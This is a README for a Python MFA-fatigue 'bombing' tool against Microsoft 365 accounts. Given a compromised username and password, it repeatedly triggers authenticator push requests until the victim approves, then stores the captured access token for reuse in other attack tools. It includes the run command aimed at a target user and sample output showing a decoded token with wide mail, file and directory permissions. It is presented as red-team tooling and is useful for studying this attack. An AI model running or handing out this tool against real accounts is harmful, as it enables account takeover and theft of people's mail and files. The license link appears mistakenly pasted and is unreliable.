# Microsoft 365 MFA Bombing Script

This Python script automates the authentication process for Microsoft 365 by using the device code flow and Selenium for automated login.
It keeps bombing the user with MFA requests and stores the access_token once the MFA was approved.

It is intended to be used in Social Engineering / Red-Team / Pentesting scenarios when targeting O365/MS-Online users in Azure (now called Entra ID).

In case a username & password combination was compromised it can be used to flood the authenticator app with authentication requests.
Once the second factor has been approved the valid JWT access_token will be stored in decoded and encoded format locally. The token can be reused in other tools like [TokenTactics](https://github.com/f-bader/TokenTacticsV2), [GraphRunner|(https://github.com/dafthack/GraphRunner) or manual requesting different endpoints in Azure...

## Applicability
Microsoft used to offer different MFA authentication mechanisms within their authenticator app like:

- Push Notification Approval
- Time-Based One-Time Password (TOTP)
- Phone Sign-in
- Number Matching
- Passwordless Sign-in

As of May 2023 Microsoft mostly disarmed this fatigue bombing attacks by enforcing the number matching mechanism which require the user to manually enter a two digit number which is presented in the browser as part of the login flow.
However it still may prove usefull nowadays in certain scenarios which I leave up to your creativity ;-)

## Usage

### Installation

1. Clone this repository.

2. Install the required dependencies by running:

   ```bash
   pip install -r requirements.txt
    ```

### Running the Script
To run the script, execute the following command:

```bash

python m365-fatigue.py --user <username> [--password <password>] [--interval <seconds> (default: 60)]
````

Replace <username> with the target Microsoft 365 username. The password can be provided directly after the --password flag, or the script will prompt for it if not supplied.

The --interval flag allows you to set the polling interval in seconds (default is 60 seconds).

### Sample output

```bash
m365-fatigue python3 m365-fatigue.py --user user@domain.com
Enter your password: 
[*] Username: user@domain.com
[*] Password: ********************************
[*] Device code:
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code GKZAQ433Q to authenticate.
Bei Ihrem Konto anmelden
https://login.microsoftonline.com/common/oauth2/deviceauth
https://login.microsoftonline.com/common/oauth2/deviceauth
Base64 encoded JWT access_token:
eyJ0 ... [dedacted] ... dsgHmA
Decoded JWT payload:
{
    "aud": "https://graph.microsoft.com",
    "iss": "https://sts.windows.net/90931373-6ad6-49cb-9d8c-22eebb6968fa/",
    "iat": 1701428346,
    "nbf": 1701428346,
    "exp": 1701433450,
    "acct": 0,
    "acr": "1",
    "aio": " ... [dedacted] ... ",
    "amr": [
        "pwd",
        "mfa"
    ],
    "app_displayname": "Microsoft Office",
    "appid": " ... [dedacted] ... ",
    "appidacr": "0",
    "family_name": " ... [dedacted] ... ",
    "given_name": " ... [dedacted] ... ",
    "idtyp": "user",
    "ipaddr": " ... [dedacted] ... ",
    "name": " ... [dedacted] ... ",
    "oid": " ... [dedacted] ... ",
    "onprem_sid": " ... [dedacted] ... ",
    "platf": "3",
    "puid": " ... [dedacted] ... ",
    "rh": " ... [dedacted] ... ",
    "scp": "AuditLog.Read.All Calendar.ReadWrite Calendars.Read.Shared Calendars.ReadWrite Contacts.ReadWrite DataLossPreventionPolicy.Evaluate Directory.AccessAsUser.All Directory.Read.All Files.Read Files.Read.All Files.ReadWrite.All Group.Read.All Group.ReadWrite.All InformationProtectionPolicy.Read Mail.ReadWrite Notes.Create Organization.Read.All People.Read People.Read.All Printer.Read.All PrintJob.ReadWriteBasic SensitiveInfoType.Detect SensitiveInfoType.Read.All SensitivityLabel.Evaluate Tasks.ReadWrite TeamMember.ReadWrite.All TeamsTab.ReadWriteForChat User.Read.All User.ReadBasic.All User.ReadWrite Users.Read",
    "sub": " ... [dedacted] ... ",
    "tenant_region_scope": "EU",
    "tid": " ... [dedacted] ... ",
    "unique_name": " ... [dedacted] ... ",
    "upn": " ... [dedacted] ... ",
    "uti": " ... [dedacted] ... ",
    "ver": "1.0",
    "wids": [
        " ... [dedacted] ... "
    ],
    "xms_tcdt":  ... [dedacted] ... ,
    "xms_tdbr": "EU"
}
[*] Successful authentication. Access token expires at: 2023-12-01 12:24:10
[*] Storing token...
Stored Base64 encoded access token as 'access_token_user@domain.com_20231201120406.txt'
Stored decoded access token as 'access_token_user@domain.com_20231201120406.json'
Exiting...
```

## TODO
The fireprox implementation is yet not finished and may or may not be implemented in the future...

# Notes
This script utilizes Selenium, which requires a compatible WebDriver (in this case, Chrome WebDriver... but you can change it towards something else if you need to).

# Credits & Acknowledgements
Heavily inspired by the awesome work of Steve Borosh ([@rvrsh3ll](https://github.com/rvrsh3ll)) and Beau Bullock ([@dafthack](https://github.com/dafthack)). Huge kudos to them for all the awesome research and tooling they release.

# License
This project is licensed under the [MIT License](https://chat.openai.com/c/LICENSE).

